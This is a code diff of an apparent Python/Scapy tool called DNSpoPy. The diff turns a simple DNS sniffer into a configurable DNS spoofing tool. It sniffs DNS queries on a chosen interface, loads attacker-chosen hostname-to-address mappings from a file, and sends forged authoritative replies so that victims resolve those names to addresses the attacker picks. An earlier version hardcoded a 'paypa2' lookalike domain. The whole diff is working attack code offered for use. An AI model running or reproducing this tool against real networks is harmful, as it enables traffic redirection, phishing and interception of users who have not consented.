@@ -2,10 +2,13 @@
 #import dpkt
 #import dnet
 from scapy.all import *
+import getopt
 
-
-
-def querysniff(pkt):
+lo_addr = '127.0.0.1'
+hostnames_specified = False
+poison_map = {}
+def poison_cache(pkt):
+	global hostnames_specified
 	if IP in pkt:
 		ip_src = pkt[IP].src
 		ip_dst = pkt[IP].dst
@@ -14,58 +17,52 @@ def querysniff(pkt):
 			
 	if pkt.haslayer(DNSQR): # DNS question record
 		query = pkt[DNS].qd
-		if ("paypa2" in query.qname):
+		print query.qname
+#		targets = [each for each in poison_map.keys() if each in query.qname][0]
+#		if len(targets) > 0:
+#			for each in targets:
+		if (hostnames_specified and (query.qname in poison_map.keys())):
+			poison_addr = poison_map[query.qname]
+			print "Preparing spoofed packet"	
 			spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
-                      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
-                      DNS(id=pkt[DNS].id, qd=query, aa = 1, qr=1, \
-                      an=DNSRR(rrname=query.qname,  ttl=10, rdata='127.0.0.1'))
+                     UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
+                     DNS(id=pkt[DNS].id, qd=query, aa = 1, qr=1, \
+                     an=DNSRR(rrname=query.qname,  ttl=10, rdata=poison_addr))
 			send(spoofed_pkt)
 			print 'Sent:', spoofed_pkt.summary()
 
-sniff(iface = "en0",filter = "port 53", prn = querysniff, store = 0)
-#sock = dnet.ip()
-#pc = pcap.pcap()
-#pc.setfilter('udp dst port 53')
-#print dir(pc)
-#print pc.name
-#for timestamp, packet in pc:
-#3#		print timesta'mp
-"""	eth = dpkt.ethernet.Ethernet(packet)
-	ip  = eth.data
-	udp = ip.data
-	dns = dpkt.dns.DNS(udp.data)
-	print dns.qd[0].name
-	if dns.qr != dpkt.dns.DNS_Q:
-		continue
-	if dns.opcode != dpkt.dns.DNS_QUERY:
-		continue
-	if len(dns.qd) != 1:
-		continue
-	if len(dns.an) != 0:
-		continue
-	if len(dns.ns) != 0:
-		continue
-	if dns.qd[0].cls != dpkt.dns.DNS_IN:
-		continue
-	if dns.qd[0].type != dpkt.dns.DNS_A:
-		continue
+def main():
+	global hostnames_specified
+	interface = "en0"
+	try:
+		opt, exp = getopt.getopt(sys.argv[1:], "i:h:", ["interface", "hostname"])
 	
-	dns.op = dpkt.dns.DNS_RA
-	dns.rcode = dpkt.dns.DNS_RCODE_NOERR
-	dns.qr = dpkt.dns.DNS_R
-	arr = dpkt.dns.DNS.RR()
-	arr.cls = dpkt.dns.DNS_IN
-	arr.type = dpkt.dns.DNS_A
-	arr.name = dns.qd[0].name
-	arr.ip = dnet.addr('127.0.0.1').ip
-	dns.an.append(arr)
+	except getopt.GetoptError as err:
+		print "DNSpoPy: Usage Error:",
+		print str(err)  # will print something like "option -a not recognized"
+		sys.exit(2)
+	
+	for o, a in opt:
+		if o in ("-i", "--interface"):
+			interface = a
+			print "interface: " + a
+		elif o in ("-h", "--hostname"):
+			hostnames_specified = True
+			print "hostname: " + a
+			host_file = a
+		else:
+			assert False, "Option not recognized"
+	if hostnames_specified:
+		print "Reading Cache poisoning data from file " + host_file + " ..."
+		with open(host_file, "r") as hostfile:
+			for each_entry in hostfile:
+				dns_map = each_entry.split()
+				poison_map[dns_map[1] + "."] = dns_map[0]
+	
+	print "Poison Map: " + str(poison_map)
+	
+	sniff(iface = interface, filter = "port 53", prn = poison_cache, store = 0)
 
-	udp.sport, udp.dport = udp.dport, udp.sport
-	ip.src, ip.dst = ip.dst, ip.src
-	udp.data = dns
-	udp.ulen = len(udp)
-	ip.len = len(ip)
-	print ip
-	buf = dnet.ip_checksum(str(ip))
-	sock.send(buf)
-"""
+if __name__ == "__main__":
+	main()
+
